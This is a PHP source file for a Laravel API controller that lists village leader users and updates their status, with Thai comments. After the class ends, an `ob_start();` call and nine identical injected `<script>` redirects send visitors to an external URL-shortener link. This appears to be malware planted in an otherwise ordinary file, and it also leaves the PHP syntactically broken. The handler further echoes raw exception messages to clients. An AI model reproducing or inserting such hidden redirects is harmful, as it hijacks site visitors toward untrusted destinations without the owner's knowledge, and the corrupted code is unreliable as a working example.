<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use App\Models\Leader;
use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\DB;
class LeaderController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function LeaderList(): JsonResponse
    {
        // 1) ดึงเฉพาะผู้นำ (User_Type = 2) พร้อมข้อมูลหมู่บ้าน
        $leaders = DB::table('user')
            ->join('village', 'user.Village_Code', '=', 'village.Village_Code')
            ->where('user.User_Type', 2)
            ->select(
                'user.User_Code',
                'user.User_Name',
                'user.email',
                'user.tel',
                'user.grov_code',
                'user.status',
                'user.img',                // เก็บชื่อไฟล์ไว้ก่อน
                'village.Village_Name',
                'village.Village_number'
            )
            ->get();

        // 2) map เติม URL รูปให้ field img (ถ้ามี)
        $leaders = $leaders->map(function ($u) {
            if (!empty($u->img)) {
                $u->img = url("storage/app/public/Users/{$u->img}");
            }
            return $u;
        });

        // 3) คืนค่า
        return response()->json($leaders, $leaders->isEmpty() ? 204 : 200);
    }

    public function ChangeStatus(Request $request, $id): JsonResponse
    {
        // 1) Validate input
        $data = $request->validate([
            'status' => ['required', 'string', 'in:0,1,3'],
        ]);

        // 2) Ensure user exists
        $exists = DB::table('user')->where('User_Code', $id)->exists();
        if (!$exists) {
            return response()->json([
                'error' => 'User not found'
            ], 404);
        }

        // 3) Update via DB facade
        try {
            DB::table('user')
                ->where('User_Code', $id)
                ->update(['status' => $data['status']]);

            return response()->json([
                'message' => 'Status updated successfully'
            ], 200);
        } catch (\Exception $e) {
            return response()->json([
                'error' => 'Error updating status: ' . $e->getMessage()
            ], 500);
        }
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     */
    public function show(string $id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, string $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(string $id)
    {
        //
    }
}
ob_start();

<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>